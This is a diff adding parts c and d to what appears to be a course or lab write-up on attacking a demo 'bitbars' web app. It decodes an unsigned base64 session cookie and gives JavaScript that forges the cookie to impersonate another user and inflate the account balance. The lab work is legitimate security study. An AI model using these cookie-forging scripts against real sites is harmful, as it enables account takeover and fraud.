@@ -33,7 +33,46 @@ After changing the settings and re-visiting our HTML, the attack shall succeed:
 
 ### c
 
+Let's inspect `document.cookie`:
+
+```text
+session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwiaGFzaGVkUGFzc3dvcmQiOiIwZmM5MjFkY2NmY2IwNzExMzJlNzIzODVmMTBkOTFkY2IyMTM5ODM3OTJkZmU5M2RlOGI1ZDMyNzRiNWE1Y2Y1Iiwic2FsdCI6IjIxODM0NzA4NDkyOTcwODYwMzY4OTQwNzEwMTMxNTYwMjE4NzQxIiwicHJvZmlsZSI6IiIsImJpdGJhcnMiOjc2fX0=
+```
+
+The value of `session` seems to be base64-encoded. Let's decode and see what it contains:
+
+```json
+{
+    "loggedIn": true,
+    "account": {
+        "username": "attacker",
+        "hashedPassword": "0fc921dccfcb071132e72385f10d91dcb213983792dfe93de8b5d3274b5a5cf5",
+        "salt": "21834708492970860368940710131560218741",
+        "profile": "",
+        "bitbars": 76
+    }
+}
+```
+
+By inspecting `router.js`, we see that once logged in, the server won't check the correctness of password. So we can simply change `account.username` to `user1`, `account.bitbars` to `200` and base64-encode it. Here's our final script:
+
+```javascript
+document.cookie = "session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6InVzZXIxIiwiaGFzaGVkUGFzc3dvcmQiOiIwZmM5MjFkY2NmY2IwNzExMzJlNzIzODVmMTBkOTFkY2IyMTM5ODM3OTJkZmU5M2RlOGI1ZDMyNzRiNWE1Y2Y1Iiwic2FsdCI6IjIxODM0NzA4NDkyOTcwODYwMzY4OTQwNzEwMTMxNTYwMjE4NzQxIiwicHJvZmlsZSI6IiIsImJpdGJhcnMiOjIwMH19";
+```
+
 ### d
+
+From our exploit at [c](#c), we learn that we can modify `account.bitbars` to any value of our choice. However, since username and other details are unknown, we need to generate our payload real-time using JavaScript:
+
+```javascript
+const b64 = document.cookie.slice(8);
+const data = JSON.parse(atob(b64));
+data.account.bitbars = 1000001;
+const payload = btoa(JSON.stringify(data));
+document.cookie = "session=" + payload;
+```
+
+After executing the code and performing a $\$1$ transaction, the balance of our account shall be $\$1000000$.
 
 ### e
 
